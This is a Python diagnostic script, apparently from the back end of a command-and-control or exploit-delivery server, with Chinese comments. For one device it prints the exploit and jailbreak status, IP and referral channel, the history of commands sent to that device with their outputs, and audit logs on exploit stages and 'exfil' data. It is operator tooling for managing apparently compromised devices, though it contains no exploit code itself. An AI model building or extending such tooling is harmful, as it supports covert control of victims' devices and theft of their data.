import sys
sys.path.insert(0, r'd:\wwwroot\coruna\server')
from admin.database import SessionLocal, Command, AuditLog, Device, ExfilData
from datetime import datetime, timedelta
from sqlalchemy import text

UUID = '4d8aaa92bdd06cd1044e7e242ef5b1c4'

db = SessionLocal()
print('='*80)
print('【1】 Device 基础信息')
d = db.query(Device).filter(Device.device_uuid == UUID).first()
if d:
    fields = ['device_uuid','os_version','device_model','chipset','status','exploit_status','jailbroken','ip','host','referer','access_path','channel_id','template_id','first_seen','last_seen']
    for f in fields:
        v = getattr(d, f, None)
        print(f'  {f:18s}: {v!r}')
else:
    print('  NOT FOUND')

print()
print('='*80)
print('【2】 Command 历史（最近 50 条）')
cmds = db.query(Command).filter(Command.device_uuid == UUID).order_by(Command.created_at.desc()).limit(50).all()
if cmds:
    for c in cmds:
        out_snip = (c.output or '')[:80].replace('\n','\\n')
        print(f'  id={c.id:<4d}  status={c.status:<10s}  created={c.created_at}  exec_at={c.executed_at}  cmd={(c.command or "")[:60]:<60s}  output_head={out_snip!r}')
else:
    print('  (没有命令记录)')

print()
print('='*80)
print('【3】 AuditLog 最近 60 条（找 exfil:sandbox 来源）')
logs = db.query(AuditLog).filter(AuditLog.device_uuid == UUID).order_by(AuditLog.created_at.desc()).limit(60).all()
if logs:
    for l in logs:
        extra = ''
        if l.source: extra += f' src={l.source}'
        if l.user_agent: extra += f' ua={(l.user_agent or "")[:40]}'
        if l.channel_id: extra += f' chid={l.channel_id}'
        if l.template_id: extra += f' tid={l.template_id}'
        print(f'  {l.created_at}  cat={l.category or "-":<12s}  method={l.method or "-":<4s}  status={l.status_code}  path={(l.path or "")[:60]:<60s}  ip={l.ip}{extra}')
else:
    print('  (没有审计日志)')

print()
print('='*80)
print('【4】 Exploit Status 更新历史：有没有任何一次把 exploit_status 从 pending 改成其他？')
# 查 audit_log 里 category=report 或 source=exploit 相关
rows = db.execute(text(
    "SELECT created_at, category, source, method, status_code, path, ip, "
    "       substr(coalesce(extra_info, details, ''), 1, 300) AS head "
    "FROM audit_log "
    "WHERE device_uuid=:uuid AND (category IN ('report','ios','exploit','stage','sandbox') "
    "       OR source LIKE '%exploit%' OR source LIKE '%stage%' OR source LIKE '%sandbox%' "
    "       OR path LIKE '%/report%' OR path LIKE '%/stage%') "
    "ORDER BY created_at DESC LIMIT 40"
), {'uuid': UUID}).fetchall()
for r in rows:
    print(f'  {r.created_at}  cat={r.category or "-":<10s}  src={r.source or "-":<20s}  method={r.method or "-":<4s}  code={r.status_code}  path={r.path or "-"}\n    head={r.head or ""}')

db.close()
